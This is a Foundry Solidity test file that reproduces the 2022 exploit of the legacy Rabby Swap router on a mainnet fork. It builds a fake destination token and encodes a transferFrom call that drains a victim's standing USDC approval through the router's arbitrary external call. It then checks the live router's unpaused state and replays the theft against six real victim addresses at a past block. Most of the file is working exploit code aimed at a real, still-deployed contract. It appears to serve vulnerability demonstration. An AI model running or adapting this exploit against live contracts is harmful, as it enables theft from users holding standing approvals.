// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

/// Minimal interfaces for the legacy Rabby Swap router (unverified on Etherscan).
interface IRabbySwap {
    function swap(
        address srcToken,
        uint256 amount,
        address dstToken,
        uint256 minReturn,
        address dexRouter,
        address dexSpender,
        bytes memory data,
        uint256 deadline
    ) external payable;

    function paused() external view returns (bool);

    function owner() external view returns (address);

    function feeRatio() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

/// Stand-in for the attacker's fake `dstToken` (returns a constant balance so the
/// router's post-swap `>= minReturn` check passes, exactly as in the 2022 exploit).
contract FakeDst {
    function balanceOf(address) external pure returns (uint256) {
        return 100e18;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    receive() external payable {}
}

contract RabbySwapLegacyTest is Test {
    // Legacy Rabby Swap router addresses (RevokeCash/approval-exploit-list/exploits/rabby.json)
    address constant ROUTER = 0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1; // Ethereum (chainId 1)
    address constant ROUTER_BSC = 0xf756a77E74954C89351c12da24C84d3c206E5355; // BNB Chain (chainId 56)

    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    bytes4 constant SWAP_SELECTOR = 0x32854cc2; // swap(address,uint256,address,uint256,address,address,bytes,uint256)

    function setUp() public {
        vm.createSelectFork(
            vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")))
        );
    }

    // ------------------------------------------------------------------
    // 1. Live state: contract deployed, not paused, selector present
    // ------------------------------------------------------------------
    function test_live_router_state() public {
        bytes memory code = ROUTER.code;
        assertGt(code.length, 0, "router has code");
        assertTrue(_contains(code, SWAP_SELECTOR), "swap selector 0x32854cc2 present in bytecode");
        bool paused = IRabbySwap(ROUTER).paused();
        assertFalse(paused, "router is NOT paused");
        emit log_named_uint("router code bytes", code.length);
        emit log_named_address("router owner", IRabbySwap(ROUTER).owner());
        emit log_named_uint("router feeRatio", IRabbySwap(ROUTER).feeRatio());
        emit log_named_string("paused", paused ? "true" : "false");
    }

    // ------------------------------------------------------------------
    // 2. A fresh, unprivileged caller (0x1111) drains a standing allowance
    //    held by a third party (the victim) against the LIVE router.
    // ------------------------------------------------------------------
    function test_fresh_caller_drains_standing_allowance() public {
        address victim = address(0x1000000000000000000000000000000000000001);
        address attacker = address(0x1111111111111111111111111111111111111111);

        // Victim holds 1,000,000 USDC and has a standing (max) approval to the router.
        deal(USDC, victim, 1_000_000e6);
        vm.prank(victim);
        IERC20(USDC).approve(ROUTER, type(uint256).max);
        assertEq(IERC20(USDC).allowance(victim, ROUTER), type(uint256).max);

        FakeDst fake = new FakeDst();

        // Arbitrary external call: dexRouter = USDC, data = transferFrom(victim, attacker, bal).
        // The router executes it, so msg.sender for transferFrom is the ROUTER -> the
        // victim's standing approval to the router is consumed.
        bytes memory data = abi.encodeWithSelector(IERC20.transferFrom.selector, victim, attacker, 1_000_000e6);

        uint256 before = IERC20(USDC).balanceOf(attacker);
        uint256 g = gasleft();
        vm.prank(attacker);
        IRabbySwap(ROUTER).swap(USDT, 0, address(fake), 4660, USDC, USDC, data, block.timestamp);
        uint256 used = g - gasleft();

        uint256 after_ = IERC20(USDC).balanceOf(attacker);
        assertEq(after_ - before, 1_000_000e6, "attacker received the victim's USDC");
        assertEq(IERC20(USDC).balanceOf(victim), 0, "victim drained");
        emit log_named_uint("drained USDC (6dp)", after_ - before);
        emit log_named_uint("gas used", used);
    }

    // ------------------------------------------------------------------
    // 3. Negative control: with no standing allowance the same call cannot
    //    move the victim's tokens (the inner transferFrom reverts).
    // ------------------------------------------------------------------
    function test_no_allowance_cannot_drain() public {
        address victim = address(0x2000000000000000000000000000000000000002);
        address attacker = address(0x3000000000000000000000000000000000000003);

        deal(USDC, victim, 1_000_000e6); // balance, but NO approval
        assertEq(IERC20(USDC).allowance(victim, ROUTER), 0);

        FakeDst fake = new FakeDst();
        bytes memory data = abi.encodeWithSelector(IERC20.transferFrom.selector, victim, attacker, 1_000_000e6);

        uint256 before = IERC20(USDC).balanceOf(attacker);
        vm.prank(attacker);
        vm.expectRevert();
        IRabbySwap(ROUTER).swap(USDT, 0, address(fake), 4660, USDC, USDC, data, block.timestamp);

        assertEq(IERC20(USDC).balanceOf(attacker) - before, 0, "nothing extracted without allowance");
    }

    // ------------------------------------------------------------------
    // 4. Historical replay of the 2022 exploit on the real deployed bytecode.
    //    Requires an archive RPC; skipped otherwise.
    // ------------------------------------------------------------------
    function test_historical_replay_2022() public {
        string memory archive = vm.envOr(
            "BLOCKPI_RPC_URL",
            vm.envOr("NODEREAL_ETH_RPC_URL", string(""))
        );
        if (bytes(archive).length == 0) {
            vm.skip(true);
        }
        vm.createSelectFork(archive, 15_724_451);

        address[6] memory victims = [
            0x94228872bb16CBCDfe010c42a8e456d15B366bF1,
            0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB,
            0xDAcCce559a0571083556f39d05b177579613D83b,
            0x720610ed4925676D971B0ae5b3080bd233E19038,
            0xf9e1D1e9F22c96752356AdFd377231528c7E851E,
            0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8
        ];

        FakeDst fake = new FakeDst();
        uint256 total;
        for (uint256 i; i < victims.length; ++i) {
            uint256 bal = IERC20(USDC).balanceOf(victims[i]);
            uint256 allow = IERC20(USDC).allowance(victims[i], ROUTER);
            if (allow >= bal && bal > 0) {
                bytes memory data = abi.encodeWithSelector(IERC20.transferFrom.selector, victims[i], address(this), bal);
                IRabbySwap(ROUTER).swap(USDT, 0, address(fake), 4660, USDC, USDC, data, block.timestamp);
                total += bal;
            }
        }
        emit log_named_uint("historically drained USDC (6dp)", total);
        assertGt(total, 0, "the 2022 path drained real victims on the deployed bytecode");
    }

    // ------------------------------------------------------------------
    // 5. The router itself holds no tokens -> no 'stuck' category.
    // ------------------------------------------------------------------
    function test_router_holds_no_tokens() public {
        assertEq(IERC20(USDC).balanceOf(ROUTER), 0);
        assertEq(IERC20(USDT).balanceOf(ROUTER), 0);
        assertEq(ROUTER.balance, 0);
    }

    // ------------------------------------------------------------------
    function _contains(bytes memory haystack, bytes4 needle) internal pure returns (bool) {
        if (haystack.length < 4) return false;
        for (uint256 i = 0; i <= haystack.length - 4; ++i) {
            if (
                haystack[i] == needle[0] && haystack[i + 1] == needle[1] && haystack[i + 2] == needle[2]
                    && haystack[i + 3] == needle[3]
            ) {
                return true;
            }
        }
        return false;
    }
}
